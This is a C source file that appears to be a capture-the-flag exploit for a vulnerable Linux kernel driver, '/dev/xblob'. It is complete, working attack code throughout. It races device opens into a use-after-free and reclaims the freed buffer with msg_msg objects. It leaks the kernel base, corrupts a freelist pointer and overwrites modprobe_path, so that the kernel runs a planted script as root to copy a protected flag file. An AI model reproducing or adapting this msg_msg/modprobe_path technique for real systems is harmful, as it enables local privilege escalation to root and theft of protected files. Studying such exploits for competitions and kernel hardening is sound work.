#include <pthread.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <fcntl.h>

int fd1 = -1;
int fd2 = -1;

typedef struct 
{
    long mtype;
    char mtext[0x10000];
} msg;

msg msgbuf;

struct msg_header
{
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
} ;

int msg_open()
{
    int qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

    if (qid == -1)
    {
        perror("msgget");
        exit(-1);
    }

    return qid;
}

int msgsend(int qid, void* msg, size_t size, int flag) {
    int res;

    if ((res = msgsnd(qid, msg, size, flag)) == -1) {
        perror("msgsnd");
        exit(-1);
    }

    return res;
}

int msgalloc(int qid, char *data, unsigned int size)
{
    msgbuf.mtype = 1;

    memcpy(msgbuf.mtext, &data[0x30], size - 0x30);

    return msgsend(qid, &msgbuf, size-0x30, 0);
}

void spray_shmem(int count, int size) {
    puts("[+] spray shmem structs");
    int shmid;
    char *shmaddr;

    for (int i = 0; i < count; i++)
    {
        if ((shmid = shmget(IPC_PRIVATE, size, 0600)) == -1)
        {
            perror("shmget error");
            exit(-1);
        }
        shmaddr = shmat(shmid, NULL, 0);

        if (shmaddr == (void *)-1)
        {
            perror("shmat error");
            exit(-1);
        }
    }
}

void doopen(void* args) {
    fd2= open("/dev/xblob", O_RDWR);
}

int main()
{    
    printf("[+] Prepare modprobe scripts\n");

    system("echo -ne '#!/bin/sh\n/bin/cp /root/flag.txt /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/copy.sh");
    system("chmod +x /tmp/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
 
    printf("[+] Open msg_msg queues\n");
    int qid = msg_open();
    int qid2 = msg_open();

    printf("[+] Try to race device opening to get two open fds\n");
    char buffer[0x1000];
    memset(buffer, 0, 0x1000);

    pthread_t thread, thread2;

    while(fd1 < 0 || fd2 < 0) {
        fd1 = -1;
        fd2 = -1;

        pthread_create(&thread, NULL, doopen, NULL);
        fd1 = open("/dev/xblob", O_RDWR);
        pthread_join(thread, NULL);

        if (fd1 <0 || fd2 < 0) {
            close(fd1);
            close(fd2);
        }
    }
    
    printf("[+] Double open (%d / %d)\n", fd1, fd2);

    // free g_buf
    printf("[+] Free g_buf by closing one fd\n");
    close(fd1);

    printf("[+] Allocate msg_msg into freed g_buf\n");
    int msgid = msgalloc(qid, buffer, 0x100-0x10);

    printf("[+] Read msg_msg header into buffer\n");
    read(fd2, buffer, 0x100);
        
    printf("[+] Increase msg_msg size via device write\n");
    unsigned long *ptr = buffer+0x18;
    *ptr = 0x1000;

    write(fd2, buffer, 0x20);

    printf("[+] Spray...\n");
    spray_shmem(20, 0x100);
    
    printf("[+] Try to leak kernel base\n");
    msgrcv(qid, buffer, 0x1000, 1, 0);
    
    unsigned long kleak = 0;

    for(int i=0; i<0x1000; i+=8) {
        ptr = buffer+i;

        if (((*ptr) & (0xfff)) == 0xbc0) {
            kleak = *ptr;
            break;
        }
    }

    unsigned long kbase = kleak - 0xeb2bc0;
    unsigned long modprobe_path = kbase + 0xe37e20;

    printf("- kernel leak : %p\n", kleak);
    printf("- kernel base : %p\n", kbase);
    printf("- modprobe    : %p\n", modprobe_path);
    
    if(kleak == 0) {
        printf("[-] Failed to leak kernel base\n");
        return -1;
    }

    printf("[+] Overwrite fd to point above modprobe_path\n");
    memset(buffer, 0, 0x100);

    ptr = buffer;

    *(ptr++) = 0xdead000000000100;
    *(ptr++) = 0xdead000000000122;

    ptr = buffer + 0x80;
    *ptr = modprobe_path-0x30;

    int hit=0;

    write(fd2, buffer, 0x100);

    char out[0x1000];

    printf("[+] Reallocate freed chunk\n");

    while(hit == 0) {
        memset(buffer, 0, 0x100);
        strcpy(buffer+0x30, "/tmp/copy.sh\x00");        
        msgalloc(qid2, buffer, 0x100);
        memset(buffer, 0x0, 0x100);
        read(fd2, buffer, 0x100);
        if (buffer[0x30] == '/') {
            hit = 1;
        }        
    }

    // overwrite modprobe_path
    printf("[+] Overwrite modprobe_path\n");
    memset(buffer, 0, 0x100);
    strcpy(buffer+0x30, "/tmp/copy.sh\x00");        
    msgalloc(qid2, buffer, 0x100);

    // Execute modprobe_path exploitation
    system("/tmp/dummy");
    system("cat /tmp/flag");
}

